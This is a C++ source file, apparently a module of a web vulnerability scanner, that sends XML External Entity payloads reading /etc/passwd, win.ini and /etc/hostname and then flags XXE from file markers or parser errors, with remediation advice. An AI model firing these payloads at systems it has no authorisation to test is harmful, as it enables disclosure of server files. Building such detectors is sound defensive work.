#include "../scanner_module.hpp"

#include <optional>
#include <regex>
#include <string>
#include <vector>

namespace aida {
namespace burp {
namespace scanner {

namespace {

std::vector<probe_t> xxe_probes(const insertion_point_t& ip, const module_context_t&)
{
    std::vector<probe_t> out;
    std::string payload_unix =
        "<?xml version=\"1.0\"?>\n"
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
        "<root>&xxe;</root>";
    std::string payload_win =
        "<?xml version=\"1.0\"?>\n"
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>\n"
        "<root>&xxe;</root>";
    std::string param_unix =
        "<?xml version=\"1.0\"?>\n"
        "<!DOCTYPE foo [<!ENTITY % p SYSTEM \"file:///etc/hostname\"><!ENTITY q \"%p;\">]>\n"
        "<root>&q;</root>";
    out.push_back({payload_unix, "root:", "file-passwd"});
    out.push_back({payload_win,  "[fonts]", "file-winini"});
    out.push_back({param_unix,   std::string(), "param-entity"});
    (void)ip;
    return out;
}

std::optional<issue_t> xxe_detect(const insertion_point_t& ip, const probe_t& probe,
                                  const exchange_observed_t& resp, const module_context_t& ctx)
{
    if (!probe.marker.empty()) {
        if (body_contains(resp, probe.marker)) {
            auto iss = make_issue("xxe.file-read", "XML External Entity (XXE) file disclosure",
                                  severity_t::critical, confidence_t::firm, ip, probe, resp, ctx,
                                  std::string("Marker indicates local file was read: ") + probe.marker);
            iss.description = "Submitting an XML payload that declares an external SYSTEM entity caused the parser to fetch and reflect the file contents, confirming XXE.";
            iss.remediation = "Disable external entity resolution in the XML parser. For libxml2: LIBXML_NONET | LIBXML_NOENT off and disable DTD loader. For Java SAX/DOM: set FEATURE_SECURE_PROCESSING and disable external general/parameter entities.";
            iss.cwe.push_back("CWE-611");
            iss.cwe.push_back("CWE-827");
            return iss;
        }
        return std::nullopt;
    }

    static const std::regex err_re(R"((Premature end of file|Entity .* was referenced but not declared|undefined entity|XML parsing error|SAXParseException))",
                                   std::regex::ECMAScript | std::regex::icase);
    std::string text(reinterpret_cast<const char*>(resp.resp_body.data()),
                     std::min<size_t>(resp.resp_body.size(), static_cast<size_t>(8192)));
    std::smatch m;
    if (std::regex_search(text, m, err_re)) {
        auto iss = make_issue("xxe.parser-error", "XML parser error suggests external entity processing",
                              severity_t::medium, confidence_t::tentative, ip, probe, resp, ctx,
                              std::string("XML parser reported: ") + m[0].str());
        iss.description = "A crafted parameter-entity XXE payload caused an XML parser error that mentions entities, suggesting the parser processes inline entity declarations.";
        iss.remediation = "Disable external/parameter entity processing in the XML parser configuration.";
        iss.cwe.push_back("CWE-611");
        return iss;
    }
    return std::nullopt;
}

bool register_self()
{
    module_t m;
    m.id = "xxe";
    m.name = "XML External Entity";
    m.category = "Injection";
    m.max_probes_per_point = 3;
    m.probes = xxe_probes;
    m.detect = xxe_detect;
    return register_module(std::move(m));
}

const bool s_registered = register_self();

}

}
}
}
